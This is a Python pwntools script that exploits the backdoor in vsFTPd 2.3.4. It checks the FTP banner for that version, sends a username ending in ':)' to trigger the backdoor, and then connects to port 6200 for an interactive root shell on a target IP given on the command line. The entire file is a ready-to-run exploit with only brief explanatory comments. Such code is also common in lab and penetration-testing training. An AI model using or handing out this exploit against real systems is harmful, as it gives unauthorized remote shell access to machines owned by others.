#!/usr/bin/python3  # Shebang: tells OS to run this with Python 3

from pwn import *
from sys import argv, exit
from time import sleep

class ExploitFTP:
    def __init__(self, ip, port=21):
        self.ip = ip
        self.port = port
        self.p = log.progress("Initializing...")  # pwntools status logger

    def trigger_backdoor(self):
        self.p.status("Checking Version")
        io = remote(self.ip, self.port)
        io.recvuntil("vsFTPd")
        
        # Extract version string from banner
        version = (io.recvuntil(")")[:-1]).decode()
        
        if version != "2.3.4":
            self.p.failure("Version 2.3.4 Not Found!!!")
            exit() 
        else:
            self.p.status("Trigerring Backdoor...")
            io.sendline("USER hello:)")
            io.sendline("PASS hello123")
            io.close()
        
    def get_shell(self):
        self.p.status("Connecting to Backdoor...")
        sleep(1)
        io = remote(self.ip, 6200)  # Connect to backdoor shell on port 6200
        self.p.success("Got Shell!!!")
        io.interactive()
        io.close()

# This block only runs if the script is executed directly (not imported)
if __name__ == "__main__":
    if len(argv) < 2 or len(argv) > 3:
        error(f"Usage: {argv[0]} IP PORT(optional)")

    # Create ExploitFTP object with IP and optional port (convert port to int)
    if len(argv) == 3:
        exploit = ExploitFTP(argv[1], int(argv[2]))
    else:
        exploit = ExploitFTP(argv[1])

    exploit.trigger_backdoor()
    exploit.get_shell()
